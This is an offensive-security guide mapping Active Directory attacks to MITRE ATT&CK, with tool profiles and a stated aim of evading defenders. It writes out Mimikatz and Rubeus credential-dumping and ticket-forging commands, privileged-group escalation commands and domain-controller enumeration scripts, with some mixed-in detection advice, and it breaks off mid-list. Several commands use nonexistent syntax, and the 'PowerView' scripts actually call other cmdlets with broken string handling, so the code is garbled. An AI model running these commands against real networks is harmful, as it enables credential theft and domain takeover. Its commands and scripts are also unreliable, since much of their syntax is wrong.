# MITRE ATT&CK® Tactics, Techniques & Procedures (TTPs) Mapping to Active Directory (AD) Attacks
> This in-depth guide maps popular and commonly-used Active Directory (AD) attack vectors to the MITRE ATT&CK® Framework. It provides a deep dive into TTPs for credential dumping, lateral movement, persistence, privilege escalation, including specialized AD CS exploitation. Designed for high-impact offensive operations, it features detection rules, attack simulations, and Windows-specific mitigation strategies.

The mapping includes:

* **Toolsets**: Essential software for AD exploitation.
* **Execution**: Exact command-line syntax for rapid deployment.
* **Tradecraft**: Pro-tips, best practices, and common pitfalls for offensive tools.
* **Evasion**: Proven strategies to bypass Blue Team defenses and security controls. 

🔸Focuses on actionable threat intel. Best for red teamss, offensive security professionals, penetration testers, ethical hackers, purple teams, vulnerability specialists, cybersecurity professional.

🔸This resource delivers actionable threat intelligence tailored for Red Teams, penetration testers, ethical hackers, and purple team practitioners looking to harden or exploit AD environments. 
## Disclaimer
```
+------------------------------------------------------------------------------------------------+
|  ⚠️ EDUCATIONAL USE ONLY ⚠️                                                                   |
|                                                                                                |
|       This repository is intended strictly for educational purposes, designed to assist        |
|       security professionals, researchers, and thical hackers in understanding attacker        |
|       tactics, techniques, and procedures (TTPs) to strengthen defensive strategies.           |
|       **The authors are not liable for any misuse of this information.**Misuse or abuse        |
|       of the material(s) provided herein against degital devices or networks for which         |
|       you do not explicitly own or do not have explicit written authorization (permission)     |
|       from device and/or network owners may result in legal action.                            |
+------------------------------------------------------------------------------------------------+
```
                                                                   
---
## Table of Contents
* [Credential Access (TA0006)](#credential-access)
* [Lateral Movement (TA0008)](#lateral-movement)
* [Persistence (TA0003)](#persistence)
* [Privilege Escalation (TA0004)](#privilege-escalation)
* [Actionable Mitigation and Defense Strategies](#actionable-mitigation-and-defense-strategies)
* [Monitoring (Detection)](#monitoring-detection)
* [Offensive Security Best Practices & Blue Team Advice](#offensive-security-best-practices-and-blue-team-advice)
* [Core Active Directory TTPs](#core-active-directory-ttps)
* [Discovery](#discovery)
* [Lateral Movement & Persistence](#lateral-movement-and-persistence)
* [Active Directory CS (Certificate Services)](#active-directory-cs-certificate-services)
* [Delegation & Relationship Attacks](#delegation-and-relationship-attacks)
* [Manipulation & Impersonation](#manipulation-and-impersonation)
* [Network & Protocol Attacks (In-Network)](#network-and-protocol-attacks-in-network)
* [Red Team Execution: Path to Domain Admin](#red-team-execution-path-to-domain-admin)
* [Technical Deep-Dive Into Evasion and Tool Command Syntax](#technical-deep-dive-into-evasion-and-tool-command-syntax)

<!-- * [License](#license) -->


## Credential Access [(TA0006)](https://attack.mitre.org/tactics/TA0006/)
* **OS Credential Dumping** [(T1003)](https://attack.mitre.org/techniques/T1003/003/): OS Credential Dumping is a, if not the, primary method threat actors use to transition from initial system access to full network compromise. By stealing password hashes or plaintext credentials stored in operating system memory or databases, attackers can escalate privileges and move laterally across an environment. This technique is frequently used by ransomware gangs and APT groups.<br>
**🔸TL;DR**: Techniques like LSASS memory dumping, `ntds.dit` theft and SAM hive dumping to obtain NTLM hashes or plaintext passwords.🔸
* **Steal or Forge Authentication Certificates [(T1649)](https://attack.mitre.org/techniques/T1649/)**: Steal or Forge Authentication Certificates is a critical MITRE ATT&CK® technique focusing on abusing Active Directory Certificate Services (AD CS) to gain unauthorized access. Because AD CS enables certificate-based authentication (using certificates instead of passwords), compromising the certificate infrastructure allows attackers to bypass traditional password-based security controls, establish long-term persistence, and escalate privileges to the highest levels (e.g., Domain Admin).<br> 
**🔸TL;DR**: Abuse of AD Certificate Services (AD CS) for persistence or privilege escalation purposes.🔸
# Tool
## Mimikatz
* Mimikatz is a powerful open-source post-exploitation tool designed to extract plain-text passwords, hashes, PINs, and Kerberos tickets directly from Windows memory (LSASS process). It is primarily used by attackers to escalate privileges, move laterally through networks, and create persistent access through techniques like pass-the-hash and Golden Ticket attacks.
## Key Capabilities and Functions
* **Credential Dumping (`sekurlsa`)**: Extracts credentials from memory, including user passwords in plain text, NTLM hashes, and Kerberos tickets.
* **Pass-the-Hash (PtH)**: Uses stolen NTLM hashes to authenticate as a user without needing the original password.
* **Pass-the-Ticket/Golden Ticket**: Generates forged Kerberos tickets to gain unauthorized domain access and impersonate any user, often indefinitely.
* **Privilege Escalation**: Elevates low-level user access to administrator or `SYSTEM`-level privileges.
* **Certificate Export**: Exports certificates and private keys from the Windows Certificate Store, even if marked as non-exportable.
* **Fileless Execution**: Often executed in memory via PowerShell or similar methods to avoid detection on disk.
* **Dumpert**: [Dumpert](https://github.com/outflanknl/dumpert) is an open-source, specialized security tool designed to create a memory dump of the Local Security Authority Subsystem Service (LSASS) process on Windows operating systems. It is primarily used during red team engagements and penetration tests to steal credentials, such as password hashes and Kerberos tickets, while avoiding detection by antivirus (AV) and Endpoint Detection and Response (EDR) solutions. 
## Key Functions and Capabilities
* **LSASS Memory Dumping**: It extracts the memory of `lsass.exe`, where sensitive user credentials are stored, saving them into a `.dmp` file.
* **AV/EDR Evasion**: Unlike standard tools (like [Sysinternals ProcDump](https://learn.microsoft.com/en-us/sysinternals/downloads/procdump) or Mimikatz), Dumpert avoids using common Windows API functions that are heavily monitored by security software.
* **Direct System Calls [(Syscalls)](https://github.com/j00ru/windows-syscalls)**: It bypasses user-mode hooks by executing system calls directly to the kernel, making it difficult for security products to detect the activity.
* **API Unhooking**: The tool unhooks API functions to further mask its activities.
* **Fileless Operation (sRDI)**: It provides an sRDI (shellcode Reflective DLL Injection) version, allowing it to be injected directly into memory via [Cobalt Strike](https://github.com/cobalt-strike), thus avoiding writing files to the disk. 
## Usage Context
* **Credential Theft**: Once the `lsass.dmp` file is created, it can be analyzed offline using tools like Mimikatz or [Pypykatz](https://github.com/skelsec/pypykatz) to extract plaintext passwords and hashes.
* **Lateral Movement**: The stolen credentials enable attackers to move laterally across a network.
* **Post-Exploitation**: It is used after gaining elevated privileges (`SYSTEM`) on a compromised system.
* **Impacket (`secretsdump`)**: Impacket's `secretsdump.py` is a powerful, open-source Python script used to remotely or locally extract sensitive secrets—such as user password hashes and credentials—from Windows systems without installing an agent on the target machine. It is widely used by penetration testers for security auditing and by attackers for lateral movement and privilege escalation.
## Core Functionalities
* **`secretsdump`**: Performs various techniques to dump secrets, including: 
* **SAM and LSA Secrets Extraction**: It reads the Security Account Manager (SAM) and Local Security Authority (LSA) registry hives to obtain local user NTLM hashes, cleartext credentials, and cached domain credentials.
* **`NTDS.dit` Extraction**: It extracts the Active Directory database (`NTDS.dit`) from Domain Controllers, allowing for the retrieval of NTLM hashes, Kerberos keys, and usernames for all domain users.
* **DCSync Attack**: It utilizes the DRSR (Directory Replication Service Remote) protocol to mimic a Domain Controller and pull password hashes, a common method used to dump domain credentials without executing code on the DC.
* **Offline Hive Parsing**: It can parse SAM, SECURITY, and `SYSTEM` registry hives that have already been dumped and saved locally.
* **Volumen Shadow Copy (VSS)**: If files are locked, it uses Volume Shadow Copies to read locked database files. 
## Key Features for Attackers/Pentester
* **Agentless**: No agent or binary is dropped on the target machine, which helps evade detection.
* **Multiple Authentication Methods**: Supports authentication via username/password, NTLM hashes (Pass-the-Hash), or Kerberos keys (Pass-the-Ticket).
* **Service Manipulation**: If required, it can remotely enable the Remote Registry service to extract credentials and restore it to its original state afterward. 
## Typical Use Case
* An attacker with local administrator privileges on one machine can use `secretsdump.PY` to connect to a domain controller or another machine, extract hashes, and then use those hashes to authenticate to other systems in the network (lateral movement).
* **BloodHound**: BloodHound is an open-source cybersecurity tool that uses graph theory to map and analyze relationships within Active Directory (AD) and Azure environments. It identifies hidden attack paths, privilege escalations, and misconfigurations, allowing red teams to move laterally and blue teams to remediate security risks. 
### Key Functions of BloodHound:
* **Attack Path Visualization**: It maps relationships between users, groups, computers, and permissions, visualizing complex AD environments.
* **Privilege Escalation Mapping**: It finds the shortest, most efficient path from a compromised low-privilege user to high-privilege targets, such as Domain Admins.
* **Data Collection (SharpHound/AzureHound)**: It uses ingestors (SharpHound for AD, AzureHound for Azure) to collect data on user sessions, group memberships, and ACLs.
* **Defensive Analysis**: Defenders (blue teams) use it to identify and eliminate dangerous privilege relationships and misconfigurations.
* **Attack Simulation**: Red teams use it to plan lateral movement and simulate ransomware-style attacks. 
## Components
* **Data Ingestors**: `sharphound.exe` (C#) or `powershell.exe` scripts gather network data.
* **Graph Database**: Neo4j stores the relationships.
* **Visualization GUI**: A web interface (Community Edition) or legacy app displays the graph, revealing attack paths. BloodHound is available as an open-source Community Edition and a managed enterprise version. 
---
## Lateral Movement [(TA0008)](https://attack.mitre.org/tactics/TA0008/)
Lateral Movement in the MITRE ATT&CK® framework refers to the techniques cyber adversaries use to navigate through a network, moving from an initially compromised system to other hosts, to expand access, steal data, or deploy ransomware. It is a critical post-compromise stage, often involving stolen credentials and legitimate tools to evade detection. 
## Key Aspects and Techniques
* Attackers use several methods to move laterally, often blending in with authorized user activity: 
  * **Remote Services [(T1021)](https://attack.mitre.org/techniques/T1021/)**: Utilizing valid credentials to log in remotely via RDP, SSH, or VPN.
  * **Lateral Tool Transfer [(T1570)](https://attack.mitre.org/techniques/T1570/)**: Moving tools or malware between systems to further the attack.
  * **Pass-the-Hash [(T1550.002)](https://attack.mitre.org/techniques/T1550/002/)**: Using stolen password hashes to authenticate, bypassing the need for a plaintext password.
  * **Exploitation of Remote Services [(T1210)](https://attack.mitre.org/techniques/T1210/)**: Exploiting vulnerabilities in network services to gain unauthorized access.
  * **Internal Spearphishing [(T1534)](https://attack.mitre.org/techniques/T1534/)**: Using a compromised internal account to send phishing emails to other employees within the same organization.
  * **Windows Admin Shares [(T1021.002)](https://attack.mitre.org/techniques/T1021/002/)**: Utilizing built-in network shares to copy files and move between systems. 
## Common Usage Examples
* **RDP/VPN Hijacking**: An attacker uses stolen VPN credentials to log into a workstation, then uses RDP to move to a sensitive server.
* **Using Admin Tools**: Utilizing Windows Management Instrumentation (WMI) or PowerShell Remoting (PSR) to execute code on remote machines.
* **Cloud Lateral Movement**: Accessing shared cloud resources by stealing API keys or leveraging misconfigured IAM roles to jump between cloud tenants. 
### ℹ️ Important Note About Lateral Movement
* This tactic is essential for threat actors to achieve their final objectives, such as stealing intellectual property, escalating privileges, or gaining persistence across an entire network. It is heavily used in approximately 60% of attacks, including ransomware campaigns. 
* **Remote Services [(T1021)](https://attack.mitre.org/techniques/T1021/)**: Remote Services involve threat actors using legitimate credentials to move laterally within a network by abusing built-in administrative tools like RDP, SMB/Admin Shares, and WMI. By blending into normal administrative activity (Living Off The Land), attackers can steal data, install malware, or pivot to new targets. 
## Key Aspects of Remote Services Lateral Movement
* **SMB/Windows Admin Shares [(T1021.002)](https://attack.mitre.org/techniques/T1021/002/)**: Attackers leverage valid accounts to connect to default administrative shares (e.g., `C$`, `ADMIN$`) to copy malicious tools and move laterally.
* **Remote Desktop Protocol [(T1021.001)](https://attack.mitre.org/techniques/T1021/001/)**: Attackers use RDP to log into systems interactively with a graphical user interface, often using stolen credentials, allowing them to act as a normal user.
* **Windows Management Instrumentation (WMI) [(T1021.003)](https://attack.mitre.org/techniques/T1021/003/)**: Attackers use WMI to execute code remotely on other Windows systems, often used for stealthy command execution, bypassing standard monitoring.
* **Other Channels**: This technique also covers abuse of SSH, VNC, Windows Remote Management, and Cloud Services to access remote infrastructure. 
## Detection and Mitigation Strategies
* **Monitor Activity**: Look for unusual logon activity, such as, for example, user accounts accessing multiple systems in a short time, or RDP/SMB activity outside of normal working hours.
* **Restrict Access**: Use Windows Firewall to restrict SMB access, disable administrative shares if not needed, and restrict local administrator accounts to specific workstations.
* **Credential Management**: Enforce strong, unique passwords for local admin accounts to prevent pass-the-hash attacks.
* * **Pass-the-Hash (PtH) / Pass-the-Ticket (PtT)**: Utilizing stolen hashes or Kerberos tickets to impersonate users.
* **TL;DR**: Using valid accounts to move laterally via SMB/Windows Admin Shares, Remote Desktop Protocol (RDP), or Windows Management Instrumentation (WMI).
### Tool
`PsExec`
### Tool Description
* `PsExec` is a lightweight command-line tool from Microsoft's Sysinternals suite that enables administrators to execute processes, scripts, and commands on remote Windows systems. It enables remote troubleshooting, software installation, and system management, such as running commands as the local SYSTEM account, without requiring manual client installation.
## Key Capabilities and Uses
* **Remote Command Execution**: Allows running tools and commands on a remote computer or multiple machines simultaneously using `psexec \\<computername>`.
* **Interactive Sessions**: Enables opening a fully interactive command prompt (`cmd.exe`) on a remote system to run commands as if sitting at that machine.
* **`SYSTEM` Privileges**: Supports running processes as the `SYSTEM` account (via the `-s` switch), which is useful for installing software or accessing restricted system files.
* **File Transfer**: Can copy binaries to remote computers and execute them via `ADMIN$` share. 
## How It Works:
* `PsExec` connects to a target machine's `ADMIN$` share via SMB (TCP port 445), copies a temporary service executable (`PSEXESVC.exe`) to it, and uses that service to launch the requested command or process.
* **ℹ️ Important Considerations**
  * **Security**: Due to its ability to remotely launch processes, it is commonly used by attackers for lateral movement, privilege escalation, and deploying malware during ransomware campaigns.
* **Requirements**: Requires administrative credentials on the target machine, and the remote machine must have file and printer sharing enabled.
* **Alternatives**: While popular, administrators may use more robust tools like PowerShell Remoting (PSR) for large-scale deployments.
### Tool
WMIExec
### Tool Description
* WmIexec is a versatile Impacket Suite tool used to execute commands and gain a semi-interactive shell on remote Windows systems. It leverages WMI and DCOM (TCP 135) for lateral movement and command execution without creating new services, making it stealthier than similar tools like `smbexec`.
## Key Features and Behaviors
* **Remote Command Execution**: Uses WMI (`Win32_Process` class) to execute commands (`cmd.exe /c`) remotely, often resulting in processes with `wmiprvse.exe` as the parent.
* **Output Redirection**: It saves command output to a file via SMB (usually in `ADMIN$`) and deletes it afterward, which allows for viewing results of commands.
* **Stealthy Operations**: It does not require installing a service on the target machine, which makes it harder to detect.
* **Requirements**: Requires valid credentials (username and password or NTLM hash) of an account with local administrator privileges.
* **Usage**: It is often used by red teams and threat actors to run commands, run PowerShell, or spawn reverse shells. 
It is widely known as a powerful tool in the Impacket library, an open-source toolset that is used to work with network protocols.
### Tool
RDP (Remote Desktop Protocol)
* The Remote Desktop Protocol (RDP) tool, developed by Microsoft, allows a user to remotely connect to, view, and control another computer over a network or internet connection. It provides a graphical interface, enabling users to operate a remote machine (like a desktop or server) as if they were physically sitting in front of it.
## Key Functions of the RDP Tool
* **Remote Access & Control**: Access a computer from a remote location, allowing for working from home, accessing files, or managing servers.
* **Remote Troubleshooting**: IT personnel can connect to an employee's machine to diagnose or fix issues.
* **File/Printer Sharing**: RDP supports resource redirection, such as printing from a remote machine to a local printer or accessing local files.
* **Virtual Desktop Experience**: Provides a fully interactive desktop environment, including mouse and keyboard input.
* **Clipboard Sharing**: Allows copying and pasting text or files between the local and remote computer.
## Key Features and Properties
* **Security**: RDP typically uses encryption to secure data transmission between the client and the server.
* **Protocol Standards**: It is based on the T-120 family of protocols, utilizing a dedicated channel (usually port 3389) for data transfer.
* **Multi-Platform Support**: While native to Windows, RDP clients exist for macOS, Linux, iOS, and Android.
* **Bandwidth Efficiency**: It is designed to run efficiently over networks, reducing the need to retransmit screen data. 
RDP is widely used in corporate environments for IT management, supporting remote work, and accessing cloud-based servers, although it requires secure configuration to avoid security risks.

## Persistence [(TA0003)](https://attack.mitre.org/techniques/TA0003/)
Persistence is a core tactic within the MITRE ATT&CK® framework, representing techniques that adversaries use to maintain access to a target system, even after disruptions such as consistent reboots, credential changes, or network interruptions. The ultimate goal of this tactic is to ensure long-term, continued presence on a compromised host to facilitate further malicious activity, such as data theft, espionage, or lateral movement. With over 20 distinct techniques categorized under it, persistence is crucial for threat actors because it allows them to retain a foothold even if their initial entry method is discovered and blocked.
## Persistence Attack Techniques and Tools
### 1. Account Manipulation [(T1098)](https://attack.mitre.org/techniques/T1098/)
* Account Manipulation is a MITRE ATT&CK® technique where adversaries modify existing, legitimate user or administrator accounts to maintain persistent access, escalate privileges, or evade detection. Unlike creating new accounts (T1136), which often triggers security alerts, manipulating existing accounts allows attackers to hide in plain sight using valid credentials.
### 2. Modifying Privileged Groups [(T1098.007)](https://attack.mitre.org/techniques/T1098/007/) 
* Attackers modify group memberships to elevate privileges from a standard user to an administrator or to gain access to sensitive resources.
* **Windows Persistenc**: Attackers use commands like `net localgroup "Administrators" [username] /add` or `net group "Domain Admins" [username] /add` to promote a compromised account.
* **Linux Persistence**: Adversaries may add a user to the `sudo` or wheel groups using `usermod -aG sudo [username]` to obtain root-level privileges.
* **Active Directory/Cloud Persistence**: Adding a user to the Domain Admins group or assigning high-level RBAC roles (e.g., Global Administrator in Office 365) ensures persistent, high-level access.
### 2. Adding Keys to `authorized_keys` [(T1098.004)](https://attack.mitre.org/techniques/T1098/004/)
* On Linux/macOS systems, attackers add their own SSH public keys to the `.ssh/authorized_keys` file of a user, allowing them to log in via SSH without a password. 
* **Mechanism**: An attacker who gains shell access will append their public key to `/home/[username]/.ssh/authorized_keys`.
* **Persistence**: Even if the attacker's original malicious process is killed, they can re-enter the system at any time using the corresponding private key, bypassing password-based security.
* **Cloud Persistence**: In cloud environments, this can be done via CLI or API to modify SSH keys on virtual machine instances. 
### 3. Manipulating User Attributes [(T1098)](https://attack.mitre.org/techniques/T1098/)
* Adversaries tweak specific account attributes to bypass security policies or maintain access. 
* **Password Policies**: Attackers may change passwords repeatedly to ensure the compromised account does not expire, or set a known password while bypassing password history requirements.
* **Service Principal Names (SPN)**: Manipulating SPNs can facilitate Kerberoasting, a technique to crack service account passwords.
### 4. MFA/Device Registration [(T1098.005)](https://attack.mitre.org/techniques/T1098/005/)
* Attackers may register a new device to a user account via Azure Entra ID or Duo self-enrollment portals to bypass Multi-Factor Authentication (MFA).
* **Logon Hours**: Modifying allowed logon hours to allow access 24/7. 
### 5. Cloud-Specific Manipulation [(T1098.003)](https://attack.mitre.org/techniques/T1098/003/)
* **Additional Cloud Roles**: In AWS, an adversary may use `AttachUserPolicy` to attach an IAM policy with excessive permissions to a compromised account.
* **OAuth Application Abuse**: Creating or modifying OAuth applications to gain long-term API access to user data (e.g., mailboxes) without needing user credentials. 
## Detection and Mitigation
* **Monitor Group Membership Changes**: Alert on unauthorized changes to sensitive groups like Domain Admins, Enterprise Admins, or `sudoers`.
* **Audit `.ssh/authorized_keys`**: Use File Integrity Monitoring (FIM) to detect modifications to `authorized_keys` files.
* **MFA Registration Monitoring**: Alert when new devices are registered for MFA, especially from anomalous locations.
* **Audit Logging**: Enable detailed auditing for user account management, password resets, and login activity.
* **TL;DR**: Modifying privileged groups, adding keys to `authorized_keys`, or manipulating user attributes.
### Tool
* Mimikatz
* **Use for**: Password Dumping and Credential Manipulation
### Password Dumping and Credential Manipulation Attack Technique Demonstration Using Mimikatz
```
# Dump all user passwords from memory (Windows 10/11)
mimikatz.exe "sekurlsa::logonPasswords"

# Extract NTLM hashes (for pass-the-hash)
mimikatz.exe "sekurlsa::ntlmv1" "sekurlsa::ntlmv2"

# Steal Kerberos tickets (for pass-the-ticket)
mimikatz.exe "kerberos::ticket"

# Use a stolen token to log in as another user
mimikatz.exe "token::elevate" "token::dump /token" "privilege::debug" "token::runas /user:Administrator"
```
### Tool Used
* Rubeus
### Tool Description
Rubeus is a specialized C# toolset designed for raw Kerberos interaction and abuse, primarily used in Windows Active Directory (AD) environments. It acts as an advanced credential extraction and manipulation tool, allowing attackers and red teams to interact directly with the Windows Kerberos client subsystem to bypass normal authentication, forge tickets, and perform lateral movement. Rubeus is frequently used to automate complex Kerberos ticket attacks, with its functionality heavily adapted from Benjamin Delpy’s Kekeo project.
## Key Kerberos Ticket Attacks Supported by Rubeus 
Rubeus supports a wide range of attack techniques, including: 
* **Kerberoasting**: Rubeus automates the process of querying Active Directory for service accounts with Registered Service Principal Names (SPNs), requesting Ticket-Granting Service (TGS) tickets, and extracting them for offline password cracking.
* **AS-REP Roasting**: It targets user accounts that have the "Do not require Kerberos preauthentication" option enabled. Rubeus requests AS-REP responses from the domain controller, which can then be subjected to offline brute-force attacks to retrieve plaintext passwords.
* **Pass-the-Ticket (PtT)**: Rubeus can extract Ticket-Granting Tickets (TGTs) or service tickets from the memory of a compromised system (LSASS) and inject them into new sessions to move laterally without needing the user's password.
* **Golden Ticket Forgery**: Rubeus can forge TGTs that grant permanent, unauthorized domain administrator access, assuming the attacker has obtained the Key Distribution Service (KDS) account hash.
* **Silver Ticket Forgery**: It allows for the creation of fraudulent service tickets, giving attackers access to specific services (like CIFS or MSSQL) without requiring interaction with the domain controller.
* **Diamond Tickets**: Rubeus is used in the creation of diamond tickets—a more modern, stealthier approach to ticket forgery that interacts with the KDC to create customized tickets. 
## Key Features and Operational Advantages
* **In-Memory Execution**: Rubeus is designed to operate entirely in memory, often avoiding file-based antivirus detection.
* **No Administrative Rights Needed**: Unlike Mimikatz, which often requires local administrator privileges to interact with LSASS, Rubeus can perform many actions (like ticket requests) as a standard domain user.
* **OPSEC Friendliness**: Rubeus can be configured to prevent caching tickets on the target host and can request only RC4-encrypted tickets, which are faster to crack, to reduce the time an attacker spends on the system.
* **Targeting Ticket Encryption**: It supports extracting TGS tickets and formatting them directly for popular cracking tools such as Hashcat and John the Ripper.
## Detection and Mitigation
* Due to its power, security teams (Blue Teams) monitor for Rubeus activity through:
* **Process Monitoring**: Detecting rubeus.exe or suspicious .NET assembly loads.
* **Command Line Logging**: Monitoring for Rubeus-specific commands like asktgt, asktgs, kerberoast, or ptt.
* **Active Directory Auditing**: Monitoring for abnormal TGT requests and auditing accounts with Kerberos preauthentication disabled.
* **Note: Rubeus is commonly used by red teams and threat actors to exploit weak service account passwords, improper privilege assignments, and excessive delegation settings in AD environments.**
* **Used for**: Kerberos Ticket Attacks
### Kerberos Ticket Attack Technique Demonstration Using Rubeus
```
# Request a TGT (Ticket Granting Ticket) with a username/password
Rubeus.exe GetTGT /user:Administrator /password:Secretpass123

# Request a service ticket using a stolen TGT
Rubeus.exe Requester /tgt:... /s:target.com /dc:domain.com

# Forge a Kerberos ticket (e.g., for pass-the-ticket)
Rubeus.exe forge /ticket:... /user:Administrator /domain:domain.com

# Use a Kerberos ticket to access a resource
Rubeus.exe Kerberos::Ticket /ticket:... /s:target.com /dc:domain.com
```
### Tool Used
* PowerView
### Tool Description
PowerView is a specialized PowerShell-based framework, originally part of PowerSploit, designed to perform Active Directory (AD) Enumeration and gain "network situational awareness" in Windows domain environments. It is heavily used by security professionals, penetration testers, and red teamers to map AD objects, identify misconfigurations, and facilitate post-exploitation activities without needing Remote Server Administration Tools (RSAT) installed.
## Key Uses of PowerView for Active Directory Enumeration
* PowerView automates the discovery of key AD components by replacing traditional Windows net commands with native PowerShell AD hooks and Win32 APIs.
* **Domain & Object Mapping**: Enumerates users, groups, computers, and domain controllers.
* **Permission & ACL Auditing**: Identifies weak Access Control Lists (ACLs) and Access Control Entries (ACEs) on objects, which often lead to privilege escalation paths.
* **Trust Relationship Mapping**: Enumerates trusts between domains and forests (e.g., `Get-DomainTrust`, `Get-ForestTrust`).
* **"User Hunting" (Lateral Movement)**: Finds where specific users are logged in across the network to identify high-value targets (e.g., `Invoke-UserHunter`).
* **Local Admin Discovery**: Identifies machines on the network where the current user has local administrator rights (e.g., `Find-LocalAdminAccess`).
* **GPO Analysis**: Enumerates Group Policy Objects (GPOs) to locate misconfigurations or credentials in scripts.
### Common PowerView Commands
* Most PowerView commands are designed to be piped together and often accept an array of hosts.
* **Use for**: Active Directory Enumeration
### Active Directory Enumeration Attack Technique Demonstration Using PowerView
This PowerView script demonstrates Active Directory Enumeration (TA0004) techniques, focusing on extracting user, group, and computer information from a domain. This is a foundational step in privilege escalation or lateral movement attacks.
---
## PowerView Active Directory Enumeration Attack Technique Demonstration
```
# Import PowerView module
Import-Module .\PowerView.ps1

# Establish connection to the AD domain
$domain = "example.com"
$domainController = "dc01.example.com"
$cred = Get-Credential -Message "Enter domain admin credentials"

# Enumerate all users in the domain with detailed properties
$users = Get-ADUser -SearchBase "DC=$domain" -Filter * -Properties *
foreach ($user in $users) {
    Write-Host "User: $user.SamAccountName"
    Write-Host "  Full Name: $user.Name"
    Write-Host "  Enabled: $user.Enabled"
    Write-Host "  Last Logon: $user.LastLogonTimestamp"
    Write-Host "  Password Never Expired: $user.PasswordNeverExpires"
    Write-Host "  ----------------------------"
}

# Enumerate all groups in the domain with members
$groups = Get-ADGroup -SearchBase "DC=$domain" -Filter * -Properties *
foreach ($group in $groups) {
    Write-Host "Group: $group.Name"
    Write-Host "  Members: $group.Members"
    Write-Host "  ----------------------------"
}

# Enumerate domain computers with OS and last logged on user
$computers = Get-ADComputer -SearchBase "DC=$domain" -Filter * -Properties *
foreach ($computer in $computers) {
    Write-Host "Computer: $computer.Name"
    Write-Host "  OS: $computer.OperatingSystem"
    Write-Host "  Last Logon: $computer.LastLogonTimestamp"
    Write-Host "  ----------------------------"
}

# Enumerate all users with passwords not set (potential targets)
$weakPasswordUsers = Get-ADUser -SearchBase "DC=$domain" -Filter {PasswordNeverExpires -eq $true -or PasswordLastSet -eq $null} -Properties *
foreach ($user in $weakPasswordUsers) {
    Write-Host "Weak Password User: $user.SamAccountName"
    Write-Host "  ----------------------------"
}

# Enumerate users with specific attributes (e.g., disabled or expired)
$disabledUsers = Get-ADUser -SearchBase "DC=$domain" -Filter {Enabled -eq $false} -Properties *
foreach ($user in $disabledUsers) {
    Write-Host "Disabled User: $user.SamAccountName"
    Write-Host "  ----------------------------"
}

# Enumerate groups with specific permissions (e.g., Domain Admins)
$privilegedGroups = Get-ADGroup -SearchBase "DC=$domain" -Filter {GroupCategory -eq "Security"} -Properties *
foreach ($group in $privilegedGroups) {
    Write-Host "Privileged Group: $group.Name"
    Write-Host "  ----------------------------"
}

# Enumerate domain controllers (critical targets)
$domainControllers = Get-ADComputer -SearchBase "DC=$domain" -Filter {OperatingSystem -like "*Windows Server*"} -Properties *
foreach ($dc in $domainControllers) {
    Write-Host "Domain Controller: $dc.Name"
    Write-Host "  ----------------------------"
}
```
## Key Enumeration Techniques Covered
* **User Enumeration**:
	* Lists all users with properties like `Name`, `Enabled`, `LastLogonTimestamp`, and`PasswordNeverExpires`.
	* Identifies users with weak passwords (e.g., `PasswordNeverExpires` or `PasswordLastSet` unset).
* **Group Enumeration**:
	* Retrieves all security groups and their respective members.
	* Highlights privileged group like `Domain Admins` or `Enterprise Admins`.
* **Computer Enumeration**:
	* Finds domain computers and their operating systems.
	* Targets domain controllers for further exploitation (e.g., Kerberos ticket manipulation, DCSync).

---

### **PowerView Script: Targeting Domain Controllers for Privilege Escalation**
This PowerView script is tailored for targeting domain controllers (DCs) to enable further exploitation like Kerberos ticket manipulation or DCSync. This script focuses on enumerating DCs and identifying users with elevated permissions or misconfigured ACLs that could be exploited for privilege escalation.

```
# Import PowerView module
Import-Module .\PowerView.ps1

# Domain name and domain controller search filter
$domain = "example.com"
$dcSearchBase = "DC=$domain"

# Step 1: Enumerate all domain controllers
$domainControllers = Get-ADComputer -SearchBase $dcSearchBase -Filter {OperatingSystem -like "*Windows Server*"} -Properties *

# Output DC details
Write-Host "### Domain Controllers Identified:"
foreach ($dc in $domainControllers) {
    Write-Host "DC Name: $dc.Name"
    Write-Host "  DNS Hostname: $dc.DistinguishedName"
    Write-Host "  Operating System: $dc.OperatingSystem"
    Write-Host "  Last Logon Timestamp: $dc.LastLogonTimestamp"
    Write-Host "  ----------------------------"
}

# Step 2: Enumerate users with Domain Admins group membership (privilege escalation target)
$domainAdminsGroup = Get-ADGroup -SearchBase $dcSearchBase -Filter {Name -eq "Domain Admins"} -Properties * | Get-ADGroupMember -Recursive

Write-Host "### Domain Admins Group Members (Potential Targets for DCSync/Kerberos Exploitation):"
foreach ($user in $domainAdminsGroup) {
    $userProperties = Get-ADUser -Identity $user -Properties *
    Write-Host "User: $($userProperties.SamAccountName)"
    Write-Host "  Full Name: $($userProperties.Name)"
    Write-Host "  Enabled: $($userProperties.Enabled)"
    Write-Host "  Password Never Expires: $($userProperties.PasswordNeverExpires)"
    Write-Host "  Last Logon: $($userProperties.LastLogonTimestamp)"
    Write-Host "  ----------------------------"
}

# Step 3: Check for users with local admin rights on DCs (lateral movement opportunity)
foreach ($dc in $domainControllers) {
    $dcName = $dc.Name
    Write-Host "### Checking Local Admin Rights on DC: $dcName"
    $localAdmins = Get-ADComputer -Identity $dcName -Properties * | Select-Object -ExpandProperty "OtherAttributes" | ForEach-Object {
        [System.Collections.ArrayList]@($_.Split(",")[0].Split("=")[1], $_.Split(",")[1].Split("=")[1])
    }

    # Filter for "LocalAccountTokenFilterPolicy" or "LocalAdmin" permissions
    $localAdmins | Where-Object { $_ -eq "LocalAccountTokenFilterPolicy" -or $_ -eq "LocalAdmin" } | ForEach-Object {
        Write-Host "  Local Admin Privilege Found: $_"
    }

    Write-Host "  ----------------------------"
}

# Step 4: Enumerate users with weak passwords on DCs (target for credential theft)
$weakPasswordUsers = Get-ADUser -SearchBase $dcSearchBase -Filter {PasswordNeverExpires -eq $true -or PasswordLastSet -eq $null} -Properties *

Write-Host "### Weak Password Users on DCs (Potential Targets for Kerberos Ticket Manipulation):"
foreach ($user in $weakPasswordUsers) {
    Write-Host "User: $($user.SamAccountName)"
    Write-Host "  Enabled: $($user.Enabled)"
    Write-Host "  Last Logon: $($user.LastLogonTimestamp)"
    Write-Host "  ----------------------------"
}

# Step 5: Check for misconfigured ACLs on DCs (e.g., users with write access to SYSVOL or NTDS.dit)
# Example: Check for users with "Write" permissions on "CN=NTDS,CN=System,DC=example,DC=com"
$ntdsObject = Get-ADObject -Identity "CN=NTDS,CN=System,$dcSearchBase" -Properties *

Write-Host "### ACLs on Critical DC Objects (e.g., NTDS.dit):"
Write-Host "  Object: CN=NTDS,CN=System,$dcSearchBase"
Write-Host "  Permissions: $ntdsObject.ObjectPermissions"
Write-Host "  ----------------------------"
```

---

### **How This Fits Into TA0004 (Privilege Escalation)**

1. **Targeting Domain Controllers**:
